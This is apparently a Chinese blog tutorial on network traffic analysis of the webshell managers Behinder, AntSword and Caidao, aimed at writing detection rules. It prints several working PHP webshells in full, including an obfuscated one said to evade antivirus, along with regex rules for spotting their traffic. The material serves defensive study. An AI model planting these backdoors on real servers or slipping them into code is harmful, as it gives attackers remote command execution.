## webshell连接工具流量分析

**本文章适合刚开始学习流量分析的朋友，大佬就可以绕过了，写的比较基础。我也是一个小白，总结一下对于webshell连接工具的使用技巧和一些规则，也分享一些自己觉得好用的方法给大家，欢迎大家帮我补充，有什么好用的技巧也可以分享一下，大家共同进步。本篇大部分内容都是自己总结的，如果有什么不对的或者不好的地方希望大家不要喷我，但是欢迎帮我指正。最后希望大家可以关注我的专栏。有任何疑问可以私信我。**  

最近接到个任务，对现在比较热门的webshell连接工具，菜刀、冰蝎、蚁剑，进行一下流量分析。

## 冰蝎（Behinder）

什么是冰蝎？

顾名思义，冰蝎是一种来自于东南亚的致命毒蝎，它尾部释放的毒液具有致幻作用，同时也可以入药，而且。。。嗯，编不下去了。回到正题。

菜刀作为老一代wenshell连接工具，它的流量特征十分明显，现如今的安全设备基本上都可以识别到菜刀的流量。现在的菜刀基本都是在安全教学中使用，现在加密webshell已经走进了大众的视野，使用这种工具管理webshell，从连接到各种操作所有流量都是加密的，很多传统的waf，webhids很难检测到。这给企业带来了新的挑战。而冰蝎就是其中的佼佼者，它是一款动态二进制加密网站管理客户端，会给流量分析应用带来很大的困扰，接下来将会对这些工具的流量特征、检测方案进行简单探讨。

这个是冰蝎的专属webshell

    
    
    <?php
    session_start();
    if (isset($_GET['pass']))
    {
        $key=substr(md5(uniqid(rand())),16);
        $_SESSION['k']=$key;
        print $key;
    }
    else
    {
        $key=$_SESSION['k'];
        $decrptContent=openssl_decrypt(file_get_contents("php://input"), "AES128", $key);
        $arr=explode('|',$decrptContent);
        $func=$arr[0];
        $params=$arr[1];
        $func($params);
    }
    ?>  
    

我们来看一下官方给出的处理过程：

首先客户端以Get形式发起带密码的握手请求，服务端产生随机密钥并写入Session。

客户端将源代码，如assert|eval("phpinfo();”)利用AES加密，发送至服务端，服务端收到之后先进行AES解密，得到中间结果字符串assert|eval("phpinfo();")。

服务端利用explode函数将拆分为一个字符串数据，索引为0的元素为字符串assert，索引为1的元素为字符串eval("phpinfo();")。

以可变函数方式调用索引为0的数组元素，参数为索引为1的数组元素，即为assert("eval(\"phpinfo;\")") 。

在测试服务器上放上我们冰蝎的专属webshell。把代理挂到burp上。

![image.png](https://image.3001.net/images/20191217/1576569232_5df8899005014.png!small)

![image.png](https://image.3001.net/images/20191217/1576569281_5df889c191e10.png!small)  

![image.png](https://image.3001.net/images/20191217/1576569246_5df8899ec9ab2.png!small)

这个是冰蝎的连接请求也就是首先客户端以Get形式发起带密码的握手请求，服务端产生随机密钥并写入Session。其实针对这个过程我们可以写一个检测规则。

Behinder-connect-server 第一组规则（注意这一组规则必须结合使用，不然误报非常严重）  
---  
['request_url']: \\.(php|jsp|asp|jspx|asa)\?(\w){1,15}=\d{2,3}$  
['response_body']: [a-z0-9]{16}$  
  
  
![image.png](https://image.3001.net/images/20191217/1576562670_5df86fee580f7.png!small)

这一组规则实际测试的效果很不错，误报也很少。有图为证，这个是实时抓取到的攻击特征流量。

![image.png](https://image.3001.net/images/20191217/1576563616_5df873a02a102.png!small)

冰蝎连接后的特征流量如下图：

#
![image.png](https://image.3001.net/images/20191217/1576554308_5df84f444d3d2.png!small)

![image.png](https://image.3001.net/images/20191217/1576566846_5df8803e99856.png!small)

结合连接时和连接后的特征流量。可以总结如下共同特征

冰蝎流量共同特征  
  
---  
1.Cookie: PHPSESSID=gkomf5c9n7psaok9gul7r41jd3; path=/  
2.Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2  
3.CAAhauBRkRWLw5WtdsJlyWv8COGLQazBUsgfx/9tKw1i5h8/lOYGNaDuoGX/dlCsq6neISlaRj2lrupZJm6IN6FngHEImmUhvCe2vzcd/CSJD711SvbS448PHdJ  
  
  
对于共同特征我们并没有选取user-agent，因为这个特征攻击者很容易修改掉，从而产生大量误报。

Behinder-webshell 第二组规则  
---  
['Cookie']: PHPSESSID=^[A-Za-z0-9]+$; path=/  
['Accept']:text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2  
['request_body']:^[A-Za-z0-9/+=]+$  
['response_body']:^[A-Za-z0-9/+=]+$  
['response_code']: 200  
  
  
包含匹配响应码的匹配主要时为了降低误报，同时包含匹配可以大大提高规则命中的效率。其实对于网络中攻击流量，安全人员更关心的是攻击成功的部分，而攻击尝试同样也值得我们注意。

## 蚁剑（AntSword）

什么是蚁剑？

难道是蚂蚁在月下独舞尚方宝剑？非也非也！

我们来看看官方介绍：

中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。

中国蚁剑推崇模块化的开发思想，遵循开源，就要开得漂亮的原则，致力于为不同层次的人群提供最简单易懂、方便直接的代码展示及其修改说明，努力让大家可以一起为这个项目贡献出力所能及的点滴，让这款工具真正能让大家用得顺心、舒适，让它能为大家施展出最人性化最适合你的能力！

同样的蚁剑也支持代理功能，我们还是将其代理到burp中便于进行流量分析。

![image.png](https://image.3001.net/images/20191217/1576569487_5df88a8f6e57a.png!small)

![image.png](https://image.3001.net/images/20191217/1576572887_5df897d718194.png!small)

![image.png](https://image.3001.net/images/20191217/1576571742_5df8935ea2bda.png!small)

我在测试中使用的这个webshell很经典，曾经号称可以绕过各大杀软。

testlele1.php

    
    
    <?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();
    ?>

![image.png](https://image.3001.net/images/20191217/1576569433_5df88a59e90ff.png!small)

这一组规则是蚁剑在连接服务器端的webshell时产生的

AntSword-connect-server  
  
---  
['request_url']: ini_set\\(.*display_errors  
['response_code']: 200  
  
  
base64混淆流量

![image.png](https://image.3001.net/images/20191217/1576571203_5df89143da381.png!small)

base64混淆检测规则  
---  
['request_url']: eval\\(.*base64_decode\\(  
['response_code']: 200  
['response_body']: ^[A-Za-z0-9]+$  
  
  
chr混淆流量  
![image.png](https://image.3001.net/images/20191217/1576571296_5df891a0e9ea6.png!small)

chr混淆规则检测  
---  
['request_url']: eval\\(chr\\(^[0-9]{0,3}$  
['response_body']: 200  
['response_body']: ^[A-Za-z0-9]  
  
chr16混淆流量

![image.png](https://image.3001.net/images/20191217/1576571501_5df8926d4baf5.png!small)

chr16混淆规则检测  
  
---  
['request_url']: eval\\(chr\\(0x.*  
['response_code']: 200  
['response_body']: ^[A-Za-z0-9]  
  
  
rot13混淆流量

![image.png](https://image.3001.net/images/20191217/1576571616_5df892e086875.png!small)

rot13混淆规则检测  
  
---  
['request_url']: eval\\(.*str_rot13  
['response_code']: 200  
['request_body']: ^[A-Za-z0-9]  
  
  
菜刀（caidao）  

什么是菜刀？

这里并不是我们平时切菜用的菜刀，如果您需要切菜用的菜刀请到某宝某东某多购买。  

中国菜刀是一款c/s型的webshell管理工具，它不像传统的asp恶意脚本或php恶意脚本上传到网站上可以直接打开，它有自己的服务端程序，但是这个服务端程序却极小，只有一句代码，因此保证了webshell的隐蔽性，并且它实现的功能也是非常强大的。作者老兵，一个朴实，低调的技术牛人。

![image.png](https://image.3001.net/images/20191218/1576653154_5df9d162b2f47.png!small)

![image.png](https://image.3001.net/images/20191218/1576653219_5df9d1a30ca1e.png!small)

注意：菜刀内部是没有设置代理的功能的，这里我们需要客户端的流量分析工具，这里我推荐大家使用proxifier或者httpanalyzerstd。下边就是它们的界面图。

proxifier  

![image.png](https://image.3001.net/images/20191218/1576651861_5df9cc557001f.png!small)

httpanalyzerstd  

![image.png](https://image.3001.net/images/20191218/1576651877_5df9cc659042b.png!small)

这也是一个很经典的webshell

    
    
    <?php array_map("ass\x65rt",(array)$_REQUEST['door']);?>

三个版本菜刀的连接流量以及进行操作的流量

11版本的菜刀流量

![image.png](https://image.3001.net/images/20191217/1576586566_5df8cd464eda3.png!small)  

![image.png](https://image.3001.net/images/20191217/1576586649_5df8cd993ea09.png!small)

11版本菜刀规则总结  
  
---  
['request_body']: eval.*QGluaV9zZXQo  
['response_code']: 200  
['response_body']: ->\|((.*\n)+|.*)\|<\-  
  
14版本的菜刀流量

![image.png](https://image.3001.net/images/20191217/1576586476_5df8ccec24c67.png!small)

![image.png](https://image.3001.net/images/20191217/1576586342_5df8cc6652e19.png!small)

14版本菜刀规则总结  
  
---  
['request_body']: $xx.*chr\\(.*QGluaV9zZXQo  
['response_code']: 200  
['response_body']: ->\|((.*\n)+|.*)\|<\-  
  
  
16版本的菜刀流量

![image.png](https://image.3001.net/images/20191217/1576586931_5df8ceb33458d.png!small)

![image.png](https://image.3001.net/images/20191217/1576589043_5df8d6f373f11.png!small)

16版本菜刀规则总结  
---  
['request_body']: array_map.*QGluaV9zZXQo  
['response_code']: 200  
['response_body']: ^X@Y((.*\n)+|.*)X@Y$  
  
  
可以看到三个版本的菜刀都有这一串字符QGluaV9zZXQo，解码后的内容是不是有些似曾相识，我们在对蚁剑连接服务器wenshell的流量进行分析时也见到过这一串字符，其实不止这么短，但是对规则而言已经足够了。蚁剑的核心源代码有很多都是借鉴菜刀的，这也说明宝刀虽老，但是精神长存啊！

![image.png](https://image.3001.net/images/20191218/1576653294_5df9d1eed4505.png!small)

所有版本菜刀通用规则  
  
---  
['request_body']: QGluaV9zZXQo  
['response_code']: 200  
['response_body']: (->\|((.*\n)+|.*)\|<-)|(^X@Y((.*\n)+|.*)X@Y$)

